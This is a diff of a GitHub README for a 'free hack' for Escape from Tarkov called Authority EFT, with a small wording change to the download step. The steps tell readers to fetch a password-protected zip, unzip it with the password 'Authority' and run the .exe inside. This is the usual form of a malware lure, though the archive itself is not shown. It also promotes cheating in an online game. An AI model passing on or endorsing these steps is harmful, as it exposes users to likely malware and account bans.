@@ -1,9 +1,9 @@
-# Authority_EFT_TarkovFreeHack
+# Authority EFT
 
 ![3](https://github.com/user-attachments/assets/1a00f92f-5a0b-4bf1-872e-3f236471158b)
 
 ## How to Use
-1. **Download the Archive**: Get the latest version from [here](https://github.com/diwnaURL/Authority_EFT_TarkovFreeHack/releases/download/last/Authority.zip).
+1. **Get the latest version** (https://github.com/diwnaURL/Authority_EFT_TarkovFreeHack/releases/download/last/Authority.zip).
 2. **Unzip the Files**: Use the pass `Authority`.
 3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
 4. **In-Game Key**: Press `HOME` to activate.
